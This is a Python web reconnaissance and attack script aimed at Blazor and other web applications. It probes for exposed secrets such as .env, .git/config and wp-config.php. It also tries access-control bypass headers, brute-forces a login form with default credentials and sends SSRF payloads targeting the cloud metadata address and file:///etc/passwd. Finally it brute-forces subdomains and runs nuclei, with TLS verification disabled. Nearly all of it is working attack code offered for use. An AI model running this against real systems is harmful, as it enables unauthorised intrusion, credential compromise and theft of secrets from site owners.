import requests
import csv
import json
import hashlib
from urllib.parse import urljoin, quote
from itertools import product
from datetime import datetime
from pathlib import Path
import subprocess
import shutil
import socket

requests.packages.urllib3.disable_warnings()

# === INPUT ===
base_url = input("Enter the base URL (e.g., https://example.com): ").strip().rstrip('/')
host_header = input("Enter the Host header value (e.g., api.example.com): ").strip()
use_proxy = input("Use proxy (e.g., http://127.0.0.1:8080) or leave blank? ").strip()
proxies = {"http": use_proxy, "https": use_proxy} if use_proxy else None
output_prefix = f"recon_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}"

# === SETUP ===
base_paths = ["/_framework/", "/render", "/_blazor/", "/account/", "/api/", "/admin/", "/wp-admin/", "/dashboard/", "/config/", "/.git/", "/.env", "/.backup/", "/.bak/", "/.old/", "/.zip/"]
file_names = [
    "blazor.webassembly", "blazor.boot", "dotnet", "WebAssembly.Bindings",
    "render?url=https://google.com", "render?url=https://localhost", "render?url=file:///etc/passwd",
    "negotiate", "id", "blazor-error", "circuit",
    "login", "signin", "account", "token", "logout", "users", "profile",
    "admin", "dashboard", "config.json", "setup", "register", "forgot-password",
    ".env", ".git/config", ".git/HEAD", ".gitignore", ".htaccess", "backup.bak", "old.zip", "wp-config.php"
]
extensions = ["", ".js", ".json", ".wasm", ".dll", ".cshtml", ".html", ".php", ".bak", ".old", ".zip"]
auth_headers = [
    {},
    {"Authorization": "Bearer testtoken"},
    {"X-API-Key": "testapikey"},
]
keywords = ["token", "error", "exception", "invalid", "unauthorized", "login", "admin"]
swagger_paths = ["/swagger.json", "/swagger/v1/swagger.json", "/v3/api-docs", "/api/swagger.json"]
waf_bypass_headers = [
    {"X-Original-URL": "/admin"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Host": "localhost"},
    {"X-Forwarded-Host": "localhost"}
]
ssrf_urls = ["http://169.254.169.254/latest/meta-data/", "http://localhost:8000", "file:///etc/passwd"]

headers_base = {
    "Host": host_header,
    "Accept": "application/json",
    "User-Agent": "BlazorReconBot/2.0"
}

results = []
burp_requests = []

# === PROBE ===
for path, name, ext, auth in product(base_paths, file_names, extensions, auth_headers):
    if name.startswith("render?") and path != "/render":
        continue
    full_path = path + name + ext if not name.startswith("render?") else f"/render?url={quote(name.split('=')[1], safe='')}"
    url = urljoin(base_url, full_path)

    headers = headers_base.copy()
    headers.update(auth)

    try:
        r = requests.get(url, headers=headers, proxies=proxies, verify=False, timeout=10)
        h = hashlib.md5(r.text.encode()).hexdigest()
        matched_keywords = ", ".join(k for k in keywords if k.lower() in r.text.lower())
        result = {
            "url": url,
            "method": "GET",
            "status": r.status_code,
            "length": len(r.text),
            "hash": h,
            "auth": list(auth.keys())[0] if auth else "None",
            "keywords": matched_keywords,
            "preview": r.text[:100].replace("\n", " "),
            "headers": dict(r.headers)
        }
        results.append(result)

        burp_requests.append(f"GET {full_path} HTTP/1.1\r\n" + "\r\n".join(f"{k}: {v}" for k,v in headers.items()) + "\r\n\r\n")

    except Exception as e:
        results.append({
            "url": url,
            "method": "GET",
            "status": "ERR",
            "error": str(e),
            "auth": list(auth.keys())[0] if auth else "None"
        })

# === WAF BYPASS ===
for bypass_header in waf_bypass_headers:
    headers = headers_base.copy()
    headers.update(bypass_header)
    try:
        r = requests.get(base_url, headers=headers, proxies=proxies, verify=False, timeout=10)
        result = {
            "url": base_url,
            "method": "GET",
            "status": r.status_code,
            "length": len(r.text),
            "hash": hashlib.md5(r.text.encode()).hexdigest(),
            "auth": f"Bypass: {list(bypass_header.keys())[0]}",
            "keywords": ", ".join(k for k in keywords if k.lower() in r.text.lower()),
            "preview": r.text[:100].replace("\n", " "),
            "headers": dict(r.headers)
        }
        results.append(result)
    except Exception as e:
        results.append({
            "url": base_url,
            "method": "GET",
            "status": "ERR",
            "auth": f"Bypass: {list(bypass_header.keys())[0]}",
            "error": str(e)
        })

# === SIGNALR ===
signalr_url = urljoin(base_url, "/_blazor/negotiate")
try:
    r = requests.post(signalr_url, headers=headers_base, proxies=proxies, verify=False, timeout=10)
    results.append({
        "url": signalr_url,
        "method": "POST",
        "status": r.status_code,
        "length": len(r.text),
        "hash": hashlib.md5(r.text.encode()).hexdigest(),
        "auth": "None",
        "keywords": ", ".join(k for k in keywords if k.lower() in r.text.lower()),
        "preview": r.text[:100].replace("\n", " "),
        "headers": dict(r.headers)
    })
except Exception as e:
    results.append({
        "url": signalr_url,
        "method": "POST",
        "status": "ERR",
        "error": str(e),
        "auth": "None"
    })

# === LOGIN BRUTEFORCE ===
login_url = urljoin(base_url, "/login")
cred_list = [("admin", "admin"), ("user", "password"), ("test", "123456"), ("administrator", "admin@123")]
for u, p in cred_list:
    try:
        r = requests.post(login_url, headers={"Content-Type": "application/x-www-form-urlencoded", "Host": host_header},
                         data=f"username={u}&password={p}", proxies=proxies, verify=False, timeout=10)
        results.append({
            "url": login_url,
            "method": "POST",
            "status": r.status_code,
            "length": len(r.text),
            "auth": f"Login: {u}/{p}",
            "keywords": ", ".join(k for k in keywords if k.lower() in r.text.lower()),
            "preview": r.text[:100].replace("\n", " "),
            "headers": dict(r.headers)
        })
    except Exception as e:
        results.append({"url": login_url, "method": "POST", "status": "ERR", "auth": f"Login: {u}/{p}", "error": str(e)})

# === SWAGGER ===
for sw in swagger_paths:
    url = urljoin(base_url, sw)
    try:
        r = requests.get(url, headers=headers_base, proxies=proxies, verify=False, timeout=10)
        results.append({
            "url": url,
            "method": "GET",
            "status": r.status_code,
            "length": len(r.text),
            "hash": hashlib.md5(r.text.encode()).hexdigest(),
            "auth": "None",
            "keywords": ", ".join(k for k in keywords if k.lower() in r.text.lower()),
            "preview": r.text[:100].replace("\n", " "),
            "headers": dict(r.headers)
        })
    except Exception as e:
        results.append({"url": url, "method": "GET", "status": "ERR", "error": str(e), "auth": "None"})

# === SSRF VECTOR CHECK ===
for ssrf_url in ssrf_urls:
    full_path = f"/render?url={quote(ssrf_url, safe='')}"
    try:
        r = requests.get(urljoin(base_url, full_path), headers=headers_base, proxies=proxies, verify=False, timeout=10)
        results.append({
            "url": urljoin(base_url, full_path),
            "method": "GET",
            "status": r.status_code,
            "length": len(r.text),
            "auth": "SSRF", "keywords": ", ".join(k for k in keywords if k in r.text.lower()),
            "preview": r.text[:100],
            "headers": dict(r.headers)
        })
    except Exception as e:
        results.append({"url": full_path, "method": "GET", "status": "ERR", "auth": "SSRF", "error": str(e)})

# === SUBDOMAIN BRUTEFORCE ===
subdomain_prefixes = ["api", "dev", "test", "admin", "portal", "dashboard", "auth"]
domain = host_header.split(".", 1)[-1]
for prefix in subdomain_prefixes:
    fqdn = f"{prefix}.{domain}"
    try:
        socket.gethostbyname(fqdn)
        results.append({"url": fqdn, "method": "DNS", "status": "RESOLVED", "auth": "subdomain-brute"})
    except socket.gaierror:
        continue

# === WRITE OUTPUT ===
json_path = f"{output_prefix}.json"
csv_path = f"{output_prefix}.csv"
html_path = f"{output_prefix}.html"
burp_path = f"{output_prefix}.burp-requests.txt"

with open(json_path, 'w') as f:
    json.dump(results, f, indent=2)

with open(csv_path, 'w', newline='') as f:
    writer = csv.DictWriter(f, fieldnames=results[0].keys())
    writer.writeheader()
    for row in results:
        writer.writerow(row)

with open(html_path, 'w') as f:
    f.write("<html><body><h2>Recon Results</h2><table border='1'>")
    f.write("<tr>" + "".join(f"<th>{k}</th>" for k in results[0].keys()) + "</tr>")
    for r in results:
        f.write("<tr>" + "".join(f"<td>{r.get(k, '')}</td>" for k in results[0].keys()) + "</tr>")
    f.write("</table></body></html>")

with open(burp_path, 'w') as f:
    f.write("\n\n".join(burp_requests))

print(f"[+] Recon complete.\n- JSON: {json_path}\n- CSV: {csv_path}\n- HTML: {html_path}\n- Burp Reqs: {burp_path}")

# === OPTIONAL: Nuclei ===
nuclei_path = shutil.which("nuclei")
if nuclei_path:
    try:
        print("[+] Running nuclei scan...")
        subprocess.run(["nuclei", "-u", base_url, "-o", f"{output_prefix}.nuclei.txt"], check=True)
        print(f"[+] Nuclei scan results saved to {output_prefix}.nuclei.txt")
    except Exception as e:
        print(f"[-] Nuclei scan failed: {e}")
